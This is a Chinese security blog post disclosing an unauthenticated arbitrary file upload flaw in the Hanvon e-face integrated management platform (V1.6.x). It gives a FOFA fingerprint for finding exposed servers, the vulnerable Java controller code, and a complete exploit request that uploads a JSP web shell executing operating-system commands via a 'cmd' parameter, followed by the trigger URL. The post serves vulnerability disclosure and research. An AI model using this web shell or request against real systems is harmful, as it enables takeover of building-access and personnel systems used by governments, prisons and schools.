---
title: "汉王e脸通综合管理平台 monadFileUpload.do 任意文件上传漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-monadFileUpload-upload-rce.html
asset_dir: assets/汉王e脸通综合管理平台-monadfileupload.do-任意文件上传漏洞
---

# 汉王e脸通综合管理平台 monadFileUpload.do 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/13 08:24
* 1319浏览
* [0评论](#comment)
* 47分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `monadFileUpload.do` 接口存在任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)。攻击者可在无需认证的情况下，通过向该接口上传恶意文件，实现任意文件上传，进而可能导致[远程代码执行](https://mrxn.net/tag/rce)或服务器被控制，严重威胁系统安全。

漏洞预警服务

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

看下 `LeaveListController` 的关于 `monadFileUpload.do` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"/monadFileUpload.do"},
        method = {RequestMethod.POST}
    )
    public RequestJson monadFileUpload(@RequestParam MultipartFile file, @RequestParam(required = false,value = "type") Integer type, @RequestParam(required = false,value = "deviceType") String deviceType) {
        RequestJson result = new RequestJson();

        String imagePath;
        String name;
        try {
            CommonsMultipartFile cf = (CommonsMultipartFile)file;
            DiskFileItem fi = (DiskFileItem)cf.getFileItem();
            File f = fi.getStoreLocation();
            SimpleDateFormat fmt = new SimpleDateFormat("yyyy-MM-dd");
            String format = fmt.format(new Date());
            name = file.getOriginalFilename();
            imagePath = this.saveImageFile(f, name, format, type, deviceType);
        } catch (Exception e) {
            e.printStackTrace();
            return RequestJson.errorResult(result, e.getMessage());
        }

        return RequestJson.successResult(result, imagePath, name);
    }

    public String saveImageFile(File fileObj, String fileName, String dirName, Integer type, String deviceType) throws Exception {
        if (fileObj == null) {
            return null;
        } else if (!fileObj.isFile()) {
            throw new Exception(getMessage("personnel_user_upload_file_formal_error2"));
        } else {
            long length = fileObj.length();
            if (length <= 0L) {
                throw new Exception(getMessage("personnel_user_upload_file_formal_error3"));
            } else if (length > 10485760L) {
                throw new Exception("图片文件不能超过10MB！当前文件大小：" + length / 1048576L + "MB");
            } else {
                if (type != null) {
                    this.VerifyThePixel(fileObj, deviceType);
                }

                String postfix = fileName.substring(fileName.lastIndexOf("."));
                String photoDir = "resource" + File.separator + dirName;
                return Utils.saveFile(photoDir, postfix, fileObj);
            }
        }
    }

    public boolean VerifyThePixel(File file, String deviceType) throws Exception {
        BufferedImage bi = null;

        try {
            bi = ImageIO.read(file);
        } catch (IOException var6) {
            throw new Exception("获取图片像素异常");
        }

        int width = bi.getWidth();
        int height = bi.getHeight();
        if (!deviceType.equals("H0810") && !deviceType.equals("M0816") && !deviceType.equals("M0816S") && !deviceType.equals("M0816Z")) {
            if (!deviceType.equals("M0710S") && !deviceType.equals("M0710Z")) {
                if (!deviceType.equals("L0515S") && !deviceType.equals("L0515Z")) {
                    if ((deviceType.equals("L0510S") || deviceType.equals("L0510S")) && (width != 720 || height != 1280)) {
                        throw new Exception("白玉的轮播图需要的像素为1280*720");
                    }
                } else if (width != 1280 || height != 720) {
                    throw new Exception("翡翠的轮播图需要的像素为720*1280");
                }
            } else if (width != 600 || height != 1024) {
                throw new Exception("青玉的轮播图需要的像素为1024*600");
            }
        } else if (width != 800 || height != 1280) {
            throw new Exception("钻石琥珀的轮播图需要的像素为1280*800");
        }

        return true;
    }
```

上传原始文件名直接带入 `saveImageFile` 方法中后，通过小数点分割文件名获取后缀作为 `postfix` 再带入 *`saveFile`* 方法在保存*，*全程无过滤和校验，造成任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)。

# 漏洞复现

```
POST /manage/leaveList/monadFileUpload.do?recoToken=67mds2pxXQb&type= HTTP/1.1
Host: hanvon.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj

------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="1.jsp"
Content-Type: image/jpeg

<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
```

访问文件执行命令 `/manage/resource/2025-xx-xx/xxxxx.jsp?cmd=whoami`

[![汉王e脸通综合管理平台 monadFileUpload.do 任意文件上传漏洞](images/img-001-b84802d3e8f0.webp)](https://image.mrxn.net/d6d359b1ef9642aaa8dded509ab0ebfc.webp)

成功得到 `whoami` [命令执行](https://mrxn.net/tag/rce)结果

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉王e脸通综合管理平台 monadFileUpload.do 任意文件上传漏洞](https://mrxn.net/jswz/hanvon-efacego-monadFileUpload-upload-rce.html)  
文章链接：<https://mrxn.net/jswz/hanvon-efacego-monadFileUpload-upload-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

物流软件安全

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-monadFileUpload-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

Windows安全工具

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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